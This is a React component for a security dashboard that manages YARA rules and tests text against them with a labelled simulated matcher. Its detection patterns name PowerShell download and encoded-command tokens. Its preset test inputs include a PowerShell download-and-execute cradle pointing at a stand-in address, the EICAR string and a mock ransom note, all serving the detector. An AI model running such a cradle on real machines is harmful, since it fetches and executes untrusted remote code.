"use client"

import { useState, useTransition } from "react"
import { toggleYaraRule, createYaraRule } from "@/app/actions"
import { SeverityBadge } from "@/components/badges"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card"
import { severityStyles, type YaraRule, type Severity } from "@/lib/irm"
import {
  FileCode2,
  CheckCircle2,
  CircleSlash,
  Play,
  Plus,
  X,
  Code,
  Info,
  Layers,
  Sparkles,
  AlertTriangle,
} from "lucide-react"

export function YaraRulesManager({ initialRules }: { initialRules: YaraRule[] }) {
  const [rules, setRules] = useState<YaraRule[]>(initialRules)
  const [openAddModal, setOpenAddModal] = useState(false)
  const [testPayload, setTestPayload] = useState("")
  const [testResults, setTestResults] = useState<{ ruleId: string; ruleName: string; matched: boolean; details?: string }[] | null>(null)
  const [error, setError] = useState<string | null>(null)
  const [pending, startTransition] = useTransition()

  // Toggle active status
  function handleToggle(id: string, currentStatus: boolean) {
    const nextStatus = !currentStatus
    setRules((prev) =>
      prev.map((r) => (r.id === id || r.rule_id === id ? { ...r, is_active: nextStatus } : r))
    )
    startTransition(async () => {
      await toggleYaraRule(id, nextStatus)
    })
  }

  // Create new rule
  function handleAddRule(formData: FormData) {
    setError(null)
    startTransition(async () => {
      const res = await createYaraRule(formData)
      if (res.ok && res.data) {
        setRules((prev) => [res.data!, ...prev])
        setOpenAddModal(false)
      } else if (!res.ok) {
        setError(res.error)
      }
    })
  }

  // Clearly labeled simulation matcher for demonstration
  function runSimulatedMatcher() {
    if (!testPayload.trim()) return

    const activeRules = rules.filter((r) => r.is_active)
    const results = activeRules.map((rule) => {
      let matched = false
      let details = ""

      // Simulate parsing pattern tokens in the demonstration rule
      if (rule.rule_id === "YARA-001") {
        matched =
          testPayload.toLowerCase().includes("downloadstring") ||
          testPayload.toLowerCase().includes("-encodedcommand")
        details = matched ? "Matched string '$s1' or '$s3'" : "No matching tokens"
      } else if (rule.rule_id === "YARA-002") {
        matched = testPayload.includes("EICAR-STANDARD-ANTIVIRUS-TEST-FILE")
        details = matched ? "Matched standard signature '$eicar'" : "Signature not present"
      } else if (rule.rule_id === "YARA-003") {
        const has1 = testPayload.toLowerCase().includes("all your files have been encrypted")
        const has2 = testPayload.toLowerCase().includes("send bitcoin to")
        const has3 = testPayload.toLowerCase().includes("decrypt your files")
        const count = [has1, has2, has3].filter(Boolean).length
        matched = count >= 2
        details = matched ? `Matched ${count} of 3 ransomware keywords (condition satisfied)` : `Matched ${count}/3 (needs >= 2)`
      } else if (rule.rule_id === "YARA-004") {
        matched = testPayload.toLowerCase().includes("powershell -e") || testPayload.toLowerCase().includes("cmd.exe /c echo")
        details = matched ? "Matched pattern switch" : "No CLI patterns"
      } else {
        // Fallback generic substring simulation for user-created rules
        const lines = rule.rule_content.split("\n")
        const stringLines = lines.filter((l) => l.trim().startsWith("$"))
        for (const line of stringLines) {
          const match = line.match(/"([^"]+)"/)
          if (match && testPayload.toLowerCase().includes(match[1].toLowerCase())) {
            matched = true
            details = `Matched string literal "${match[1]}"`
            break
          }
        }
      }

      return {
        ruleId: rule.rule_id,
        ruleName: rule.rule_name,
        matched,
        details,
      }
    })

    setTestResults(results)
  }

  return (
    <div className="space-y-6">
      {/* Simulation & Production Requirement Notice */}
      <Card className="border-sky-500/30 bg-sky-500/5">
        <CardContent className="p-4 flex items-start gap-3">
          <Info className="h-5 w-5 text-sky-400 shrink-0 mt-0.5" />
          <div className="space-y-1 text-xs text-sky-200/90 leading-relaxed">
            <p className="font-semibold text-sky-300">
              YARA Simulation vs Real Scanning Production Requirements
            </p>
            <p>
              The rule tester below provides a <strong>clearly labelled simulation</strong> using safe regular expression and token parsing. 
              Metadata display is not native YARA engine execution.
            </p>
            <p className="text-sky-300/80">
              <strong>Production Deployment Requirements:</strong> Real YARA scanning in a production SOC requires:
              (1) The native C <code className="font-mono bg-sky-950/60 px-1 py-0.5 rounded">libyara</code> library or <code className="font-mono bg-sky-950/60 px-1 py-0.5 rounded">yara-python</code> bindings, 
              (2) A hardened execution sandbox (microVM / Docker) with memory and CPU timeouts to prevent ReDoS attacks,
              (3) Kernel file system driver hooks or eBPF tracepoints for continuous scanning.
            </p>
          </div>
        </CardContent>
      </Card>

      {/* Rules Management Controls */}
      <div className="flex items-center justify-between">
        <div>
          <h3 className="text-base font-semibold">Active YARA Rule Set</h3>
          <p className="text-xs text-muted-foreground">
            Metadata synchronized with Supabase &apos;yara_rules&apos; table.
          </p>
        </div>
        <Button onClick={() => setOpenAddModal(true)} size="sm">
          <Plus className="h-4 w-4 mr-1" /> Add Rule
        </Button>
      </div>

      {/* Rules Grid */}
      <div className="grid gap-4 lg:grid-cols-2">
        {rules.map((rule) => {
          const s = severityStyles(rule.severity as Severity)
          const isSample = rule.rule_id.startsWith("YARA-00")

          return (
            <Card key={rule.id} className="flex flex-col justify-between">
              <CardContent className="p-5 space-y-3">
                <div className="flex items-start justify-between gap-3">
                  <div className="space-y-1">
                    <div className="flex items-center gap-2">
                      <span className="font-mono text-xs font-semibold text-muted-foreground bg-muted/60 px-2 py-0.5 rounded">
                        {rule.rule_id}
                      </span>
                      {isSample && (
                        <span className="rounded bg-sky-500/10 px-1.5 py-0.5 text-[10px] font-mono text-sky-400 border border-sky-500/20">
                          DEMO SAMPLE
                        </span>
                      )}
                    </div>
                    <h4 className="font-semibold text-sm text-foreground">{rule.rule_name}</h4>
                  </div>
                  <div className="flex items-center gap-2">
                    <SeverityBadge severity={rule.severity as Severity} />
                    <button
                      onClick={() => handleToggle(rule.id, rule.is_active)}
                      disabled={pending}
                      className={`inline-flex items-center gap-1 rounded-full px-2 py-0.5 text-[11px] font-medium border transition-colors ${
                        rule.is_active
                          ? "border-emerald-500/30 bg-emerald-500/10 text-emerald-400 hover:bg-emerald-500/20"
                          : "border-muted-foreground/30 bg-muted text-muted-foreground hover:bg-muted/80"
                      }`}
                      title="Click to toggle active status"
                    >
                      {rule.is_active ? (
                        <>
                          <CheckCircle2 className="h-3 w-3" /> Active
                        </>
                      ) : (
                        <>
                          <CircleSlash className="h-3 w-3" /> Inactive
                        </>
                      )}
                    </button>
                  </div>
                </div>

                <p className="text-xs text-muted-foreground leading-relaxed">{rule.description}</p>

                {/* YARA Rule Code Preview */}
                <div className="rounded-md bg-muted/40 p-3 font-mono text-[11px] text-foreground/90 overflow-x-auto border border-border/50 max-h-36">
                  <pre>{rule.rule_content}</pre>
                </div>
              </CardContent>
            </Card>
          )
        })}
      </div>

      {/* Simulated YARA Pattern Tester */}
      <Card>
        <CardHeader>
          <div className="flex items-center justify-between">
            <div>
              <CardTitle className="text-base flex items-center gap-2">
                <Play className="h-4 w-4 text-primary" />
                Simulated YARA Pattern Tester
              </CardTitle>
              <CardDescription>
                Test sample payload text against active demonstration rules (Simulated Engine)
              </CardDescription>
            </div>
            <span className="rounded bg-amber-500/10 px-2 py-0.5 text-[10px] font-mono text-amber-400 border border-amber-500/20">
              SIMULATED SCAN
            </span>
          </div>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="flex flex-wrap gap-2 text-xs">
            <span className="text-muted-foreground self-center">Preload Test:</span>
            <button
              onClick={() => setTestPayload("powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"(New-Object Net.WebClient).DownloadString('http://198.51.100.42/payload.ps1')\"")}
              className="rounded bg-muted px-2.5 py-1 text-xs hover:bg-muted/80 transition-colors"
            >
              PowerShell Download
            </button>
            <button
              onClick={() => setTestPayload("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")}
              className="rounded bg-muted px-2.5 py-1 text-xs hover:bg-muted/80 transition-colors"
            >
              EICAR Signature
            </button>
            <button
              onClick={() => setTestPayload("Attention: all your files have been encrypted. Send bitcoin to decrypt your files now.")}
              className="rounded bg-muted px-2.5 py-1 text-xs hover:bg-muted/80 transition-colors"
            >
              Ransomware Extortion Note
            </button>
            <button
              onClick={() => setTestPayload("2026-10-11 Clean diagnostic message. No anomalous activity.")}
              className="rounded bg-muted px-2.5 py-1 text-xs hover:bg-muted/80 transition-colors"
            >
              Clean Text
            </button>
          </div>

          <textarea
            rows={3}
            value={testPayload}
            onChange={(e) => setTestPayload(e.target.value)}
            placeholder="Paste text snippet or test payload here…"
            className="w-full resize-none rounded-md border border-input bg-background p-3 font-mono text-xs outline-none focus:ring-2 focus:ring-ring"
          />

          <div className="flex justify-end">
            <Button onClick={runSimulatedMatcher} disabled={!testPayload.trim()}>
              <Play className="h-3.5 w-3.5 mr-1" /> Evaluate Active Rules
            </Button>
          </div>

          {testResults && (
            <div className="rounded-lg border border-border bg-muted/20 p-4 space-y-3">
              <p className="text-xs font-semibold uppercase tracking-wider text-muted-foreground">
                Simulated Evaluation Results ({testResults.filter((r) => r.matched).length} triggered)
              </p>
              <div className="divide-y divide-border/50">
                {testResults.map((res) => (
                  <div key={res.ruleId} className="py-2.5 flex items-center justify-between text-xs">
                    <div className="space-y-0.5">
                      <div className="flex items-center gap-2">
                        <span className="font-mono font-semibold">{res.ruleId}</span>
                        <span className="text-foreground">{res.ruleName}</span>
                      </div>
                      <p className="text-[11px] text-muted-foreground">{res.details}</p>
                    </div>
                    <div>
                      {res.matched ? (
                        <span className="inline-flex items-center gap-1 font-semibold text-red-400 bg-red-500/10 px-2 py-0.5 rounded border border-red-500/20">
                          MATCH TRIGGERED
                        </span>
                      ) : (
                        <span className="text-muted-foreground">No Match</span>
                      )}
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}
        </CardContent>
      </Card>

      {/* Add Rule Modal */}
      {openAddModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
          <div className="absolute inset-0 bg-black/70 backdrop-blur-xs" onClick={() => setOpenAddModal(false)} aria-hidden />
          <div className="relative z-10 w-full max-w-lg rounded-xl border border-border bg-card p-5 shadow-2xl space-y-4">
            <div className="flex items-center justify-between border-b border-border pb-3">
              <div>
                <h3 className="font-semibold text-base">Create YARA Rule</h3>
                <p className="text-xs text-muted-foreground">Define rule metadata and pattern strings</p>
              </div>
              <button
                onClick={() => setOpenAddModal(false)}
                className="rounded-md p-1.5 text-muted-foreground hover:bg-muted"
              >
                <X className="h-4 w-4" />
              </button>
            </div>

            <form action={handleAddRule} className="space-y-4">
              <div className="space-y-1.5">
                <label className="text-xs font-medium text-muted-foreground">Rule Name</label>
                <input
                  name="rule_name"
                  required
                  placeholder="e.g. SUSPICIOUS_C2_USER_AGENT"
                  className="w-full rounded-md border border-input bg-background px-3 py-2 text-sm outline-none focus:ring-2 focus:ring-ring font-mono"
                />
              </div>

              <div className="grid grid-cols-2 gap-3">
                <div className="space-y-1.5">
                  <label className="text-xs font-medium text-muted-foreground">Severity</label>
                  <select
                    name="severity"
                    className="w-full rounded-md border border-input bg-background px-3 py-2 text-sm outline-none focus:ring-2 focus:ring-ring"
                  >
                    <option value="Critical">Critical</option>
                    <option value="High">High</option>
                    <option value="Medium">Medium</option>
                    <option value="Low">Low</option>
                  </select>
                </div>
                <div className="space-y-1.5">
                  <label className="text-xs font-medium text-muted-foreground">Description</label>
                  <input
                    name="description"
                    placeholder="Brief rationale"
                    className="w-full rounded-md border border-input bg-background px-3 py-2 text-sm outline-none focus:ring-2 focus:ring-ring"
                  />
                </div>
              </div>

              <div className="space-y-1.5">
                <label className="text-xs font-medium text-muted-foreground">YARA Rule Content</label>
                <textarea
                  name="rule_content"
                  rows={5}
                  required
                  defaultValue={`rule Custom_Rule_Sample {
    strings:
        $token = "suspicious_keyword" nocase
    condition:
        $token
}`}
                  className="w-full rounded-md border border-input bg-background p-3 font-mono text-xs outline-none focus:ring-2 focus:ring-ring"
                />
              </div>

              {error && <p className="text-xs text-red-400">{error}</p>}

              <div className="flex justify-end gap-2 pt-2">
                <Button type="button" variant="outline" onClick={() => setOpenAddModal(false)} disabled={pending}>
                  Cancel
                </Button>
                <Button type="submit" disabled={pending}>
                  {pending ? "Saving…" : "Save Rule"}
                </Button>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  )
}
